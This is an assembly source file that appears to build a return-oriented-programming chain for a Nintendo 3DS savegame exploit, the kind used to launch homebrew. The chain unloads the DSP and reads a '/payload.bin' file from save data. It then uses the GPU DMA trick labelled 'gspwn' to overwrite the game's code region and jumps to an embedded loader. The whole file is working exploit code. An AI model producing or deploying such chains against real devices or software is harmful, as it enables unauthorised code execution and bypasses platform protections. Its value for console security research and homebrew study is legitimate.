.nds

.include "v_save/v_constants.s"
.include "v_save/v_macros.s"

.create "build/rop.bin",V_ROP_COPYTO

.fill (V_ROP_COPYTO+(V_ROP_TARGET - V_ROP_COPYTO) - .), 0x0

; Start ROP
rop:
    .word 0xF00FF00F
    .word 0xF00FF00F
    .word 0xF00FF00F
    .word 0xF00FF00F
    .word 0xF00FF00F

    ; Shutdown DSP
    DSPDSP_UnloadComponent
    DSPDSP_RegisterInterruptEvents 0x0, 0x2, 0x2

    ; Read otherapp payload from savegame to linear
    FSUSER_OpenFileDirectly file_handle, 0, ARCHIVE_SAVEDATA, PATH_EMPTY, empty_string, 0x1, PATH_ASCII, payload_file, (payload_file_end - payload_file), FS_OPEN_READ, 0x0    
    FSFILE_GetSize file_handle, payload_size
    FSFILE_Read file_handle, payload_bytes_read, 0, 0, LINEAR_BUFFER+0x10000, payload_size
    FSFILE_Close file_handle

    ; Copy loader from stack to linear
    memcpy LINEAR_BUFFER, initial_bin, (initial_bin_end - initial_bin)

    ; Flush these to RAM
    flush_dcache LINEAR_BUFFER, 0x00100000

    ; DMA loader
    gspwn (V_CODE_LINEAR_BASE + (INITIAL_VA - 0x00100000)), LINEAR_BUFFER, 0x1000
    svcSleepThread 100*1000*1000, 0

    ; DMA otherapp
    gspwn (V_CODE_LINEAR_BASE + (PAYLOAD_VA - 0x00100000)), LINEAR_BUFFER+0x10000, 0xC000
    svcSleepThread 300*1000*1000, 0

    ; Jump to loader
    .word INITIAL_VA

    .word 0xDEAF0000

file_handle:
    .word 0x0

empty_string:
    .word 0x0

payload_size:
    .word 0x0
    .word 0x0
    
payload_bytes_read:
    .word 0x0
    .word 0x0

payload_file:
    .ascii "/payload.bin",0
payload_file_end:

.align 0x10
initial_bin:
    .incbin "v_code/v_code.bin"
initial_bin_end:

.fill (V_ROP_COPYTO+0x3700 - .), 0x56
.close
